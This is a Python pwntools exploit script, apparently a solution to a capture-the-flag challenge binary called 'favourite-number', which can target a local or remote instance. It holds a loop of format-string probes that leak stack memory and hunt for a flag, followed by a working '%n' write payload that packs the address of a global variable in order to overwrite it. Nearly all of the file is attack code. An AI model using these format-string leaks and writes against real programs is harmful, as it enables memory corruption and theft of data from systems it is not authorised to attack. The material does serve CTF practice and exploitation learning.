from pwn import *


def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdb_script, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([exe] + argv, *a, **kwargs)


# GDB script
gdb_script = """
b *0x0804873f
b *0x0804870d
b *0x080487db
continue
"""

# Prepare program
exe = "./favourite-number"
context.binary = binary = ELF(exe, checksec=True)
context.log_level = "DEBUG"


# Buffer size is 39, only 13 of these printed!
def dump_stack():
    found_flag = ""
    for i in range(0, 100):
        try:
            io = start()
            res = io.recvlines(2)
            # info(res)
            # &favourite_number = 0x0804a044
            io.sendline(f"%{i}$p| %{i}$s".encode("latin-1"))
            # res = io.recvuntil(b"\n")
            res = io.recvall()
            if str(res).find("flag") != -1:
                found_flag = str(res)
            print(f"{i} : {str(res)}")
            # print(f"{i} : {str(res).encode("latin-1")}")

            print(50 * "-" + "\n")
        # info(res)
        except Exception as err:
            print(err)

    print("Flag: " + found_flag)

    # dump_stack()
    # 0x0804a000
    # 0xffc45438
    # 0x080487e0


our_buff = 0xFFFFC690
favourite_number_addr = 0x0804A044
# loc = 0x0804A044 - 0x8048719
io = start()
res = io.recvlines(2)
print(res)
# info(res)
# This works! Padd it with 4 bytes
payload = b"    %4$n    "
# payload = b"    %4$s    "
# payload = b"\x52\x85\x04\x08%4$c"
# payload = b"%x," * 16
payload += p32(favourite_number_addr, "little")
print("Payload: ")
print(payload)

io.sendline(payload)
# res = io.recvuntil(b"\n")
# io.interactive()
res = io.recvall()
info(res)
if str(res).find("flag") != -1:
    found_flag = str(res)
# print(f"{loc} : {str(res)}")
# print(f"{i} : {str(res).encode("latin-1")}")

print(50 * "-" + "\n")

# loc = 643
# io = start()
# res = io.recvlines(2)
# # info(res)
# # &favourite_number = 0x0804a044
# payload = f"{loc}%n".encode("latin-1")
# io.sendline(payload)
# # res = io.recvuntil(b"\n")
# res = io.recvall()
# if str(res).find("flag") != -1:
#     found_flag = str(res)
# print(f"{loc} : {str(res)}")
# # print(f"{i} : {str(res).encode("latin-1")}")

# print(50 * "-" + "\n")


# info(res)
